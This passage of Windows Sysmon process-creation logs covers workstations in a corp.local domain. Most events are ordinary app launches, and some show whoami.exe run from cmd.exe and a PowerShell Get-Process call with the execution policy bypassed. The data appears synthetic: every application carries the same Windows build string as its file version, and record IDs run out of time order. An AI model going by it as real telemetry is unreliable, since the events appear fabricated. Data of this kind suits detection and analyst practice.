    <Data Name="UtcTime">2026-07-10 10:36:28.504</Data>
    <Data Name="ProcessGuid">{8b903388-2be5-668e-396c-22dc339c06c2}</Data>
    <Data Name="ProcessId">4494</Data>
    <Data Name="Image">C:\Program Files\Google\Chrome\Application\chrome.exe</Data>
    <Data Name="FileVersion">10.0.19041.1 (WinBuild.160101.0800)</Data>
    <Data Name="Description">Google Chrome</Data>
    <Data Name="Product">Google Chrome</Data>
    <Data Name="Company">Google LLC</Data>
    <Data Name="OriginalFileName">chrome.exe</Data>
    <Data Name="CommandLine">"C:\Program Files\Google\Chrome\Application\chrome.exe"</Data>
    <Data Name="CurrentDirectory">C:\Users\qroberts\</Data>
    <Data Name="User">CORP\qroberts</Data>
    <Data Name="LogonGuid">{bdd00702-2d44-668e-f47c-f843e6c7b1ae}</Data>
    <Data Name="LogonId">0xf5fbcf</Data>
    <Data Name="TerminalSessionId">3</Data>
    <Data Name="IntegrityLevel">Medium</Data>
    <Data Name="Hashes">MD5=06802DB1326D8078886FE10D5FAA395B,SHA256=89CDA942FBD4FA5003D2E689E9A57A3D675D8F2112E0E349AEC2718992957AB4</Data>
    <Data Name="ParentProcessGuid">{25c0aaa8-cb85-668e-c7c8-7fe280698a8a}</Data>
    <Data Name="ParentProcessId">3042</Data>
    <Data Name="ParentImage">C:\Windows\explorer.exe</Data>
    <Data Name="ParentCommandLine">"C:\Windows\explorer.exe"</Data>
    <Data Name="ParentUser">CORP\qroberts</Data>
  </EventData>
</Event>
<Event>
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"/>
    <EventID>1</EventID>
    <Version>5</Version>
    <Level>4</Level>
    <Task>1</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2026-07-10T10:39:05.9257363Z"/>
    <EventRecordID>117224</EventRecordID>
    <Correlation/>
    <Execution ProcessID="3684" ThreadID="3968"/>
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>WKSTN-017.corp.local</Computer>
    <Security UserID="S-1-5-18"/>
  </System>
  <EventData>
    <Data Name="RuleName">-</Data>
    <Data Name="UtcTime">2026-07-10 10:39:05.925</Data>
    <Data Name="ProcessGuid">{27129915-12cd-668e-9b56-3314266ac63e}</Data>
    <Data Name="ProcessId">9046</Data>
    <Data Name="Image">C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE</Data>
    <Data Name="FileVersion">10.0.19041.1 (WinBuild.160101.0800)</Data>
    <Data Name="Description">Microsoft Outlook</Data>
    <Data Name="Product">Microsoft Office</Data>
    <Data Name="Company">Microsoft Corporation</Data>
    <Data Name="OriginalFileName">OUTLOOK.EXE</Data>
    <Data Name="CommandLine">"C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE"</Data>
    <Data Name="CurrentDirectory">C:\Users\mrodriguez\</Data>
    <Data Name="User">CORP\mrodriguez</Data>
    <Data Name="LogonGuid">{d0f28fcb-1feb-668e-4be4-72c63c06f221}</Data>
    <Data Name="LogonId">0x241c73</Data>
    <Data Name="TerminalSessionId">2</Data>
    <Data Name="IntegrityLevel">Medium</Data>
    <Data Name="Hashes">MD5=AE06C61DCE00B8CCC7476E10F3A00F28,SHA256=1D6756960CAF99657EA0F54A4BA8BA363D06957DF6F6C6470187D8EB9DD8DF83</Data>
    <Data Name="ParentProcessGuid">{47dcf192-f206-668e-23f9-1a037650788b}</Data>
    <Data Name="ParentProcessId">6454</Data>
    <Data Name="ParentImage">C:\Windows\explorer.exe</Data>
    <Data Name="ParentCommandLine">"C:\Windows\explorer.exe"</Data>
    <Data Name="ParentUser">CORP\mrodriguez</Data>
  </EventData>
</Event>
<Event>
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"/>
    <EventID>1</EventID>
    <Version>5</Version>
    <Level>4</Level>
    <Task>1</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2026-07-10T10:50:46.2490857Z"/>
    <EventRecordID>117146</EventRecordID>
    <Correlation/>
    <Execution ProcessID="3684" ThreadID="3968"/>
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>WKSTN-099.corp.local</Computer>
    <Security UserID="S-1-5-18"/>
  </System>
  <EventData>
    <Data Name="RuleName">-</Data>
    <Data Name="UtcTime">2026-07-10 10:50:46.249</Data>
    <Data Name="ProcessGuid">{fbbece52-3a90-668e-9862-697db7215ff3}</Data>
    <Data Name="ProcessId">1105</Data>
    <Data Name="Image">C:\Windows\System32\whoami.exe</Data>
    <Data Name="FileVersion">10.0.19041.1 (WinBuild.160101.0800)</Data>
    <Data Name="Description">whoami - displays logged on user information</Data>
    <Data Name="Product">Microsoft® Windows® Operating System</Data>
    <Data Name="Company">Microsoft Corporation</Data>
    <Data Name="OriginalFileName">whoami.exe</Data>
    <Data Name="CommandLine">whoami.exe</Data>
    <Data Name="CurrentDirectory">C:\Users\xdavis\</Data>
    <Data Name="User">CORP\xdavis</Data>
    <Data Name="LogonGuid">{e6edf30b-4ef0-668e-e9b2-b6188a10504c}</Data>
    <Data Name="LogonId">0xb23289</Data>
    <Data Name="TerminalSessionId">2</Data>
    <Data Name="IntegrityLevel">Medium</Data>
    <Data Name="Hashes">MD5=7F169B15ACEC1718068DEB9247D31274,SHA256=E521A3778C139540375B75162C3D7D072F7C0E9FDF5110B42831F0E3D78B0A35</Data>
    <Data Name="ParentProcessGuid">{3a0d43e4-ca2e-668e-653d-421f74537c2a}</Data>
    <Data Name="ParentProcessId">5252</Data>
    <Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data>
    <Data Name="ParentCommandLine">"C:\Windows\System32\cmd.exe" </Data>
    <Data Name="ParentUser">CORP\xdavis</Data>
  </EventData>
</Event>
<Event>
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"/>
    <EventID>1</EventID>
    <Version>5</Version>
    <Level>4</Level>
    <Task>1</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2026-07-10T11:13:52.1473210Z"/>
    <EventRecordID>117243</EventRecordID>
    <Correlation/>
    <Execution ProcessID="3684" ThreadID="3968"/>
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>WKSTN-064.corp.local</Computer>
    <Security UserID="S-1-5-18"/>
  </System>
  <EventData>
    <Data Name="RuleName">-</Data>
    <Data Name="UtcTime">2026-07-10 11:13:52.147</Data>
    <Data Name="ProcessGuid">{b5418116-f2ff-668e-bbc4-e80cc325d417}</Data>
    <Data Name="ProcessId">3590</Data>
    <Data Name="Image">C:\Windows\System32\whoami.exe</Data>
    <Data Name="FileVersion">10.0.19041.1 (WinBuild.160101.0800)</Data>
    <Data Name="Description">whoami - displays logged on user information</Data>
    <Data Name="Product">Microsoft® Windows® Operating System</Data>
    <Data Name="Company">Microsoft Corporation</Data>
    <Data Name="OriginalFileName">whoami.exe</Data>
    <Data Name="CommandLine">whoami.exe</Data>
    <Data Name="CurrentDirectory">C:\Users\ylewis\</Data>
    <Data Name="User">CORP\ylewis</Data>
    <Data Name="LogonGuid">{4739ad30-c3c1-668e-9b0b-522416d03c83}</Data>
    <Data Name="LogonId">0x2bf462</Data>
    <Data Name="TerminalSessionId">3</Data>
    <Data Name="IntegrityLevel">Medium</Data>
    <Data Name="Hashes">MD5=088D12F38178DA88B0C0A1D4E8ACD7B1,SHA256=F84829409BEED5A69ECC2B613C9F4C3F9CA04C4EC23CC4CD06948CDF13CBC5FF</Data>
    <Data Name="ParentProcessGuid">{1cb2daf2-533d-668e-1223-477615abf41d}</Data>
    <Data Name="ParentProcessId">3416</Data>
    <Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data>
    <Data Name="ParentCommandLine">"C:\Windows\System32\cmd.exe" </Data>
    <Data Name="ParentUser">CORP\ylewis</Data>
  </EventData>
</Event>
<Event>
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"/>
    <EventID>1</EventID>
    <Version>5</Version>
    <Level>4</Level>
    <Task>1</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2026-07-10T11:14:25.5829951Z"/>
    <EventRecordID>117261</EventRecordID>
    <Correlation/>
    <Execution ProcessID="3684" ThreadID="3968"/>
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>WKSTN-064.corp.local</Computer>
    <Security UserID="S-1-5-18"/>
  </System>
  <EventData>
    <Data Name="RuleName">-</Data>
    <Data Name="UtcTime">2026-07-10 11:14:25.582</Data>
    <Data Name="ProcessGuid">{72d1b021-bb62-668e-23b6-515c911676d7}</Data>
    <Data Name="ProcessId">9357</Data>
    <Data Name="Image">C:\Program Files\Google\Chrome\Application\chrome.exe</Data>
    <Data Name="FileVersion">10.0.19041.1 (WinBuild.160101.0800)</Data>
    <Data Name="Description">Google Chrome</Data>
    <Data Name="Product">Google Chrome</Data>
    <Data Name="Company">Google LLC</Data>
    <Data Name="OriginalFileName">chrome.exe</Data>
    <Data Name="CommandLine">"C:\Program Files\Google\Chrome\Application\chrome.exe"</Data>
    <Data Name="CurrentDirectory">C:\Users\ylewis\</Data>
    <Data Name="User">CORP\ylewis</Data>
    <Data Name="LogonGuid">{d9f84d98-08e6-668e-5fdd-7ea2fe9859ce}</Data>
    <Data Name="LogonId">0xde8e3b</Data>
    <Data Name="TerminalSessionId">1</Data>
    <Data Name="IntegrityLevel">Medium</Data>
    <Data Name="Hashes">MD5=298C6A72AADC946804C0C8CCD2354474,SHA256=8CF4517E67F81C26DF9AF718AACAECBEC01BA24CFD8886D75E1BD38DB6885119</Data>
    <Data Name="ParentProcessGuid">{f1507e52-699e-668e-3ded-c7840792595c}</Data>
    <Data Name="ParentProcessId">1830</Data>
    <Data Name="ParentImage">C:\Windows\explorer.exe</Data>
    <Data Name="ParentCommandLine">"C:\Windows\explorer.exe"</Data>
    <Data Name="ParentUser">CORP\ylewis</Data>
  </EventData>
</Event>
<Event>
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"/>
    <EventID>1</EventID>
    <Version>5</Version>
    <Level>4</Level>
    <Task>1</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2026-07-10T11:54:47.1617442Z"/>
    <EventRecordID>117240</EventRecordID>
    <Correlation/>
    <Execution ProcessID="3684" ThreadID="3968"/>
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>WKSTN-064.corp.local</Computer>
    <Security UserID="S-1-5-18"/>
  </System>
  <EventData>
    <Data Name="RuleName">-</Data>
    <Data Name="UtcTime">2026-07-10 11:54:47.161</Data>
    <Data Name="ProcessGuid">{e6fbb82f-d106-668e-f3d9-b309bf78dd98}</Data>
    <Data Name="ProcessId">4342</Data>
    <Data Name="Image">C:\Program Files (x86)\Microsoft\Teams\current\Teams.exe</Data>
    <Data Name="FileVersion">10.0.19041.1 (WinBuild.160101.0800)</Data>
    <Data Name="Description">Microsoft Teams</Data>
    <Data Name="Product">Microsoft Teams</Data>
    <Data Name="Company">Microsoft Corporation</Data>
    <Data Name="OriginalFileName">Teams.exe</Data>
    <Data Name="CommandLine">"C:\Program Files (x86)\Microsoft\Teams\current\Teams.exe"</Data>
    <Data Name="CurrentDirectory">C:\Users\uwilliams\</Data>
    <Data Name="User">CORP\uwilliams</Data>
    <Data Name="LogonGuid">{61c5a147-1c8c-668e-5879-7b8ca5353bc1}</Data>
    <Data Name="LogonId">0x5b0f3d</Data>
    <Data Name="TerminalSessionId">1</Data>
    <Data Name="IntegrityLevel">Medium</Data>
    <Data Name="Hashes">MD5=7E2016A9D9CD0916FC8E8ED32D2553A1,SHA256=7CABD21193A766B4DC037AA005AF6030259BE32B1C2936CB1BA337DE2DF2F009</Data>
    <Data Name="ParentProcessGuid">{f67e1a40-acdb-668e-26e9-ee27e878b1ca}</Data>
    <Data Name="ParentProcessId">3518</Data>
    <Data Name="ParentImage">C:\Windows\explorer.exe</Data>
    <Data Name="ParentCommandLine">"C:\Windows\explorer.exe"</Data>
    <Data Name="ParentUser">CORP\uwilliams</Data>
  </EventData>
</Event>
<Event>
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"/>
    <EventID>1</EventID>
    <Version>5</Version>
    <Level>4</Level>
    <Task>1</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2026-07-10T11:58:03.9537257Z"/>
    <EventRecordID>117259</EventRecordID>
    <Correlation/>
    <Execution ProcessID="3684" ThreadID="3968"/>
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>WKSTN-064.corp.local</Computer>
    <Security UserID="S-1-5-18"/>
  </System>
  <EventData>
    <Data Name="RuleName">-</Data>
    <Data Name="UtcTime">2026-07-10 11:58:03.953</Data>
    <Data Name="ProcessGuid">{9e6befe6-48aa-668e-73b2-5f464d84b3a5}</Data>
    <Data Name="ProcessId">2454</Data>
    <Data Name="Image">C:\Program Files (x86)\Microsoft\Teams\current\Teams.exe</Data>
    <Data Name="FileVersion">10.0.19041.1 (WinBuild.160101.0800)</Data>
    <Data Name="Description">Microsoft Teams</Data>
    <Data Name="Product">Microsoft Teams</Data>
    <Data Name="Company">Microsoft Corporation</Data>
    <Data Name="OriginalFileName">Teams.exe</Data>
    <Data Name="CommandLine">"C:\Program Files (x86)\Microsoft\Teams\current\Teams.exe"</Data>
    <Data Name="CurrentDirectory">C:\Users\ylewis\</Data>
    <Data Name="User">CORP\ylewis</Data>
    <Data Name="LogonGuid">{d917a0ed-bbb6-668e-ba21-44eea9eeff8b}</Data>
    <Data Name="LogonId">0xbafa52</Data>
    <Data Name="TerminalSessionId">3</Data>
    <Data Name="IntegrityLevel">Medium</Data>
    <Data Name="Hashes">MD5=5B9346E497FF10F19AB99DE83DD46ADF,SHA256=34AB7A05EDE80C9344F4FCB629B3683F11A9BA79BBABD53D66BFDD1B0920D196</Data>
    <Data Name="ParentProcessGuid">{bbed2aa1-713d-668e-a98e-c3a0993a0489}</Data>
    <Data Name="ParentProcessId">8484</Data>
    <Data Name="ParentImage">C:\Windows\explorer.exe</Data>
    <Data Name="ParentCommandLine">"C:\Windows\explorer.exe"</Data>
    <Data Name="ParentUser">CORP\ylewis</Data>
  </EventData>
</Event>
<Event>
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"/>
    <EventID>1</EventID>
    <Version>5</Version>
    <Level>4</Level>
    <Task>1</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2026-07-10T12:13:34.2466213Z"/>
    <EventRecordID>117271</EventRecordID>
    <Correlation/>
    <Execution ProcessID="3684" ThreadID="3968"/>
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>WKSTN-099.corp.local</Computer>
    <Security UserID="S-1-5-18"/>
  </System>
  <EventData>
    <Data Name="RuleName">-</Data>
    <Data Name="UtcTime">2026-07-10 12:13:34.246</Data>
    <Data Name="ProcessGuid">{f35b4126-1c8d-668e-34cf-32d66b71627f}</Data>
    <Data Name="ProcessId">6598</Data>
    <Data Name="Image">C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE</Data>
    <Data Name="FileVersion">10.0.19041.1 (WinBuild.160101.0800)</Data>
    <Data Name="Description">Microsoft Word</Data>
    <Data Name="Product">Microsoft Office</Data>
    <Data Name="Company">Microsoft Corporation</Data>
    <Data Name="OriginalFileName">WINWORD.EXE</Data>
    <Data Name="CommandLine">"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"</Data>
    <Data Name="CurrentDirectory">C:\Users\xdavis\</Data>
    <Data Name="User">CORP\xdavis</Data>
    <Data Name="LogonGuid">{3e754472-eeda-668e-078e-b1aafff2e962}</Data>
    <Data Name="LogonId">0x8c5479</Data>
    <Data Name="TerminalSessionId">1</Data>
    <Data Name="IntegrityLevel">Medium</Data>
    <Data Name="Hashes">MD5=4969A6B722AFB14E51816CBEBD58663D,SHA256=CE0AA0C8788312094FF86B843032D3647BEA69232AF169EBC12D95C59AA9D505</Data>
    <Data Name="ParentProcessGuid">{61ac4fb7-7aa5-668e-d514-8f8f3355c69b}</Data>
    <Data Name="ParentProcessId">9031</Data>
    <Data Name="ParentImage">C:\Windows\explorer.exe</Data>
    <Data Name="ParentCommandLine">"C:\Windows\explorer.exe"</Data>
    <Data Name="ParentUser">CORP\xdavis</Data>
  </EventData>
</Event>
<Event>
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"/>
    <EventID>1</EventID>
    <Version>5</Version>
    <Level>4</Level>
    <Task>1</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2026-07-10T12:51:29.8433978Z"/>
    <EventRecordID>117275</EventRecordID>
    <Correlation/>
    <Execution ProcessID="3684" ThreadID="3968"/>
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>WKSTN-005.corp.local</Computer>
    <Security UserID="S-1-5-18"/>
  </System>
  <EventData>
    <Data Name="RuleName">-</Data>
    <Data Name="UtcTime">2026-07-10 12:51:29.843</Data>
    <Data Name="ProcessGuid">{85db92d6-5fd7-668e-a573-56c65ed0f185}</Data>
    <Data Name="ProcessId">5289</Data>
    <Data Name="Image">C:\Program Files (x86)\Microsoft\Teams\current\Teams.exe</Data>
    <Data Name="FileVersion">10.0.19041.1 (WinBuild.160101.0800)</Data>
    <Data Name="Description">Microsoft Teams</Data>
    <Data Name="Product">Microsoft Teams</Data>
    <Data Name="Company">Microsoft Corporation</Data>
    <Data Name="OriginalFileName">Teams.exe</Data>
    <Data Name="CommandLine">"C:\Program Files (x86)\Microsoft\Teams\current\Teams.exe"</Data>
    <Data Name="CurrentDirectory">C:\Users\rpatel\</Data>
    <Data Name="User">CORP\rpatel</Data>
    <Data Name="LogonGuid">{c6becdd4-270a-668e-b288-b855baa3661a}</Data>
    <Data Name="LogonId">0xd2dfe6</Data>
    <Data Name="TerminalSessionId">1</Data>
    <Data Name="IntegrityLevel">Medium</Data>
    <Data Name="Hashes">MD5=2B93D6B330DF9A37D7CB0A082F7F4478,SHA256=4DFE1656342E27B9EA4325EAD7F62296730C571DA8007307D9B21142492802E1</Data>
    <Data Name="ParentProcessGuid">{7be72b72-2d52-668e-6a79-e1b0f0ffb099}</Data>
    <Data Name="ParentProcessId">2052</Data>
    <Data Name="ParentImage">C:\Windows\explorer.exe</Data>
    <Data Name="ParentCommandLine">"C:\Windows\explorer.exe"</Data>
    <Data Name="ParentUser">CORP\rpatel</Data>
  </EventData>
</Event>
<Event>
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"/>
    <EventID>1</EventID>
    <Version>5</Version>
    <Level>4</Level>
    <Task>1</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2026-07-10T13:05:40.6023420Z"/>
    <EventRecordID>117266</EventRecordID>
    <Correlation/>
    <Execution ProcessID="3684" ThreadID="3968"/>
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>WKSTN-088.corp.local</Computer>
    <Security UserID="S-1-5-18"/>
  </System>
  <EventData>
    <Data Name="RuleName">-</Data>
    <Data Name="UtcTime">2026-07-10 13:05:40.602</Data>
    <Data Name="ProcessGuid">{b0adb377-aa12-668e-8655-fdd65f184663}</Data>
    <Data Name="ProcessId">3337</Data>
    <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
    <Data Name="FileVersion">10.0.19041.1 (WinBuild.160101.0800)</Data>
    <Data Name="Description">Windows PowerShell</Data>
    <Data Name="Product">Microsoft® Windows® Operating System</Data>
    <Data Name="Company">Microsoft Corporation</Data>
    <Data Name="OriginalFileName">PowerShell.EXE</Data>
    <Data Name="CommandLine">"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -ExecutionPolicy Bypass -Command Get-Process</Data>
    <Data Name="CurrentDirectory">C:\Users\mchen\</Data>
    <Data Name="User">CORP\mchen</Data>
    <Data Name="LogonGuid">{6a6190ff-b371-668e-d204-43ce9a6e39e7}</Data>
    <Data Name="LogonId">0x1922a9</Data>
    <Data Name="TerminalSessionId">3</Data>
    <Data Name="IntegrityLevel">Medium</Data>
    <Data Name="Hashes">MD5=419724E9725DDDBC1576C2DBA0D48EAA,SHA256=A4DE417CF14EA300BDF1D0AE22522CE657B6770B89A2DAF1E964371485C8DAA3</Data>
    <Data Name="ParentProcessGuid">{0c12f11b-4428-668e-be9d-b0a4f05bd339}</Data>
    <Data Name="ParentProcessId">9264</Data>
    <Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data>
    <Data Name="ParentCommandLine">"C:\Windows\System32\cmd.exe" /c powershell.exe -NoProfile -ExecutionPolicy Bypass -Command Get-Process</Data>
    <Data Name="ParentUser">CORP\mchen</Data>
  </EventData>
</Event>
<Event>
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"/>
    <EventID>1</EventID>
    <Version>5</Version>
    <Level>4</Level>
    <Task>1</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2026-07-10T13:06:03.6362674Z"/>
    <EventRecordID>117270</EventRecordID>
    <Correlation/>
    <Execution ProcessID="3684" ThreadID="3968"/>
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>WKSTN-042.corp.local</Computer>
    <Security UserID="S-1-5-18"/>
  </System>
  <EventData>
    <Data Name="RuleName">-</Data>
    <Data Name="UtcTime">2026-07-10 13:06:03.636</Data>
    <Data Name="ProcessGuid">{cb77d670-afb9-668e-6e10-93c87ee143e0}</Data>
    <Data Name="ProcessId">9349</Data>
    <Data Name="Image">C:\Program Files (x86)\Microsoft\Teams\current\Teams.exe</Data>
    <Data Name="FileVersion">10.0.19041.1 (WinBuild.160101.0800)</Data>
    <Data Name="Description">Microsoft Teams</Data>
    <Data Name="Product">Microsoft Teams</Data>
    <Data Name="Company">Microsoft Corporation</Data>
    <Data Name="OriginalFileName">Teams.exe</Data>
    <Data Name="CommandLine">"C:\Program Files (x86)\Microsoft\Teams\current\Teams.exe"</Data>
    <Data Name="CurrentDirectory">C:\Users\jsmith\</Data>
    <Data Name="User">CORP\jsmith</Data>
    <Data Name="LogonGuid">{bb2c672f-6c9f-668e-0891-cb9b4a6be0fc}</Data>
    <Data Name="LogonId">0xe9fe7b</Data>
    <Data Name="TerminalSessionId">3</Data>
    <Data Name="IntegrityLevel">Medium</Data>
    <Data Name="Hashes">MD5=B08C50FAD45E35D04C23D0307D02802E,SHA256=1164FC50BEEFF128E4C433ADC9D0FE6ABC3541B36BC7E95B11FB3DE8DF6B343F</Data>
    <Data Name="ParentProcessGuid">{8e135a57-6f2e-668e-bc3e-ceb1b3f77021}</Data>
    <Data Name="ParentProcessId">6457</Data>
    <Data Name="ParentImage">C:\Windows\explorer.exe</Data>
    <Data Name="ParentCommandLine">"C:\Windows\explorer.exe"</Data>
    <Data Name="ParentUser">CORP\jsmith</Data>
  </EventData>
</Event>
